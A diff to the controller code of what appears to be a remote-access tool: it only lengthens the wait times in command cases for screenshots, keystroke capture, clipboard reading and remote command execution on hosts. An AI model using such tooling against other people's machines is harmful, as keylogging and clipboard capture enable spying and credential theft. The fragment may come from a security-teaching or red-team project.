@@ -75,7 +75,7 @@ def _send_command(top_level: object, command_str: str, args: List[Any] = []) -> 
         case 'ScreenshotCommand':
             # Wait 5 seconds before attempting to retrieve PNG image,
             # accounting for latency, etc.
-            sleep(5)
+            sleep(15)
             command_output = IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out')
             # Opens PNG in native image viewer.
             _view_img(host_addr, host_port)
@@ -84,7 +84,7 @@ def _send_command(top_level: object, command_str: str, args: List[Any] = []) -> 
             top_level.bottom_col_frame.frame_1.add_text("Please wait for ~30s...")
             # Wait for considerable time so that enough keystrokes
             # can be captured.
-            sleep(35)
+            sleep(45)
             top_level.bottom_col_frame.frame_1.remove_text()
             if command_output := IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out'):
                 # Decode bytes of keystrokes, set output in CTK.
@@ -95,7 +95,7 @@ def _send_command(top_level: object, command_str: str, args: List[Any] = []) -> 
             top_level.bottom_col_frame.frame_1.remove_text()
             top_level.bottom_col_frame.frame_1.add_text("Please wait...")
             # Wait 5s to capture appropriate clipboard contents.
-            sleep(5)
+            sleep(15)
             top_level.bottom_col_frame.frame_1.remove_text()
             if command_output := IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out'):
                 top_level.bottom_col_frame.frame_1.add_text(command_output.decode())
@@ -104,7 +104,7 @@ def _send_command(top_level: object, command_str: str, args: List[Any] = []) -> 
         case 'ExecuteCommand':
             top_level.bottom_col_frame.frame_1.remove_text()
             top_level.bottom_col_frame.frame_1.add_text("Please wait...")
-            sleep(5)
+            sleep(15)
             top_level.bottom_col_frame.frame_1.remove_text()
             if command_output := IfaWrapper.get_host_attribute(host_addr, host_port, 'command_out'):
                 # Convert stdout/stderr from bytes to string for displaying.
